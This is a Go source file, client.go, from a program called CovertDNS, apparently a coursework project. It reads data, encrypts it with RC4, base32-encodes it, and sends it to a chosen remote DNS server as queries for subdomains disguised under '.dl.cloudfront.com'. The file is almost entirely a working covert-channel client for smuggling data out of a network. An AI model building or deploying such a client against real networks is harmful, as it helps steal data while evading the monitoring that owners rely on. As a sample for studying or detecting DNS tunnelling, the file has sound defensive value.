/* ----------------------------------------------------------------------------
SOURCE FILE

Name:		client.go

Program:	CovertDNS

Developer:	Andrew Burian

Created On: 	2015-09-24

Functions:
	func client(src io.Reader, remote, secret string)

Description:
	Contains client-side functions.

Revisions:
	(none)

---------------------------------------------------------------------------- */
package main

import (
	"github.com/miekg/dns"
	"io"
	"crypto/rc4"
	"encoding/base32"
	"strings"
)

/* ----------------------------------------------------------------------------
FUNCTION

Name:		Client

Prototype:	func client(src io.Reader, remote, secret string)

Developer:	Andrew Burian

Created On:	2015-09-24

Parameters:
	src io.Reader
		the source of data to send from
	remote string
		the remote address of the DNS server
	sectret string
		the rc4 encryption key to encrypt with

Return Values:
	(none)

Description:
	Sends and data read from src to the remote, after being
	encrypted with the secret and imbedded in DNS requests.

Revisions:
	(none)
---------------------------------------------------------------------------- */
func client(src io.Reader, remote, secret string) {

	// set up the new rc4 cipher
	cipher, err := rc4.NewCipher([]byte(secret))
	if err != nil {
		panic(err)
	}

	// loop through all data to send
	for {
		// text buffer to store input
		text := make([]byte, 32)

		// read data from source
		n, err := src.Read(text)
		if n == 0 {
			break
		}
		if err != nil && err != io.EOF {
			panic(err)
		}

		// encrypt the data (dst, src)
		cipher.XORKeyStream(text, text[:n])

		// encode the data (dst, src)
		encoded := base32.StdEncoding.EncodeToString(text[:n])

		// trim the non-domain standard '='
		encoded = strings.TrimRight(encoded, "=")
		// padding will be re-added at the receiving end

		// send it via dns request
		dnssend(encoded, remote)

	}
}

/* ----------------------------------------------------------------------------
FUNCTION

Name:		DNSSend

Prototype:	func dnssend(msg, remote string)

Developer:	Andrew Burian

Created On:	2015-09-24

Parameters:
	msg string
		the message to send
	remote string
		the remote address of the DNS server

Return Values:
	(none)

Description:
	Handles the DNS sending of the encoded message

Revisions:
	(none)
---------------------------------------------------------------------------- */
func dnssend(msg, remote string) {

	// create a new dns query message
	dnsMessage := new(dns.Msg)

	// embedd message in url
	msg += ".dl.cloudfront.com"

	// set the question (auto creates a RR)
	dnsMessage.SetQuestion(dns.Fqdn(msg), dns.TypeA)

	// send and wait on response (syncronous)
	_, err := dns.Exchange(dnsMessage, remote + ":53")

	if err != nil {
		panic(err)
	}
}
